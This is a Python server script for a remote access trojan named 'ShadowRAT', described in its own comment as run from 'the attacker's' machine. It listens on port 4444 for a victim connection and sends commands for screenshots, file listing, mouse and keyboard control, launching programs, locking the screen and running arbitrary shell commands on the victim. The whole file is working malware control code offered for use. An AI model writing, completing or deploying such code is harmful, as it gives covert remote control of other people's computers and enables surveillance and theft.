# server.py
# **This script is meant to be run on the attacker's/admin machine**

import socket
import os

# Function to clear the screen and display the banner
def show_interface():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(r'''
███████╗███████╗██████╗░██╗░░░██╗██████╗░░█████╗░████████╗
╚════██║██╔════╝██╔══██╗╚██╗░██╔╝██╔══██╗██╔══██╗╚══██╔══╝
░░███╔═╝█████╗░░██████╦╝░╚████╔╝░██████╔╝██║░░██║░░░██║░░░
██╔══╝░░██╔══╝░░██╔══██╗░░╚██╔╝░░██╔═══╝░██║░░██║░░░██║░░░
███████╗███████╗██████╦╝░░░██║░░░██║░░░░░╚█████╔╝░░░██║░░░
╚══════╝╚══════╝╚═════╝░░░░╚═╝░░░╚═╝░░░░░░╚════╝░░░░╚═╝░░░

ShadowRAT Server 
''')
    print("Waiting for incoming connection...\n")

# Function to show the list of available commands
def show_help():
    print('''
Available Commands:
    info                  → Get OS and current directory info
    screenshot            → Save a screenshot to client's machine
    list <path>           → List files in the specified directory
    move_mouse <x> <y>    → Move mouse on client screen
    type <text>           → Type text on client
    open <program>        → Open a program (e.g., notepad.exe)
    lock                  → Lock the client screen (Windows only)
    cmd <command>         → Run system shell command on client
    help                  → Show this help message
    exit                  → Close the session
''')

# ==== Server Setup ====
show_interface()

host = 'YourIP'  # Your IP address (must match client)
port = 4444            # Port to listen on

# Create socket, bind, and listen for one connection
s = socket.socket()
s.bind((host, port))
s.listen(1)

# Accept incoming connection
client, addr = s.accept()
print(f"[+] Connected to {addr}\nType 'help' to see available commands.")

# Command loop to interact with client
while True:
    try:
        command = input("ShadowRAT> ").strip()  # Read command from user
        if command == "":
            continue
        if command == "help":
            show_help()
            continue

        client.send(command.encode())  # Send command to client

        if command == "exit":
            print("[*] Closing connection...")
            break

        # Receive and display response from client
        response = client.recv(4096).decode()
        print(f"\n[Client Response]:\n{response}\n")
    except Exception as e:
        print(f"[!] Error: {e}")
        break

# Cleanup
client.close()
s.close()
